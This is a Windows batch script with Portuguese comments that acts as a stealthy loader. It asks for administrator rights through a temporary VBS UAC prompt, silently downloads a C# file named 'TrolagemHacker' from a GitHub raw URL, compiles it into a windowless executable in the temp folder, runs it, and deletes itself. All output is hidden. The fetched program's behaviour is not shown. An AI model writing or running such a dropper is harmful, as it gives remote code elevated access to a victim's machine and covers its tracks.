@echo off
:: --- PEDIR PERMISSÃO DE ADMINISTRADOR ---
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo Pedindo permissao de administrador...
    goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B
:gotAdmin
    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
    pushd "%CD%"
    CD /D "%~dp0"

:: --- CONFIGURAÇÕES ---
set "GITHUB_RAW_URL=https://raw.githubusercontent.com/espertin/wind/main/TrolagemHacker_GitHub.cs"
set "TEMP_CS=%temp%\TrolagemHacker.cs"
set "EXE_OUT=%temp%\TrolagemHacker.exe"

:: --- LOCALIZAR COMPILADOR ---
set "CSC_PATH=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
if not exist "%CSC_PATH%" set "CSC_PATH=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"

:: --- DOWNLOAD E COMPILAÇÃO ---
powershell -Command "(New-Object Net.WebClient).DownloadFile('%GITHUB_RAW_URL%', '%TEMP_CS%')" >nul 2>&1
if exist "%TEMP_CS%" (
    "%CSC_PATH%" /target:winexe /out:"%EXE_OUT%" "%TEMP_CS%" >nul 2>&1
)

:: --- EXECUÇÃO E LIMPEZA ---
if exist "%EXE_OUT%" (
    start "" "%EXE_OUT%"
    (goto) 2>nul & del /f /q "%~f0"
    exit
) else (
    (goto) 2>nul & del /f /q "%~f0"
    exit
)
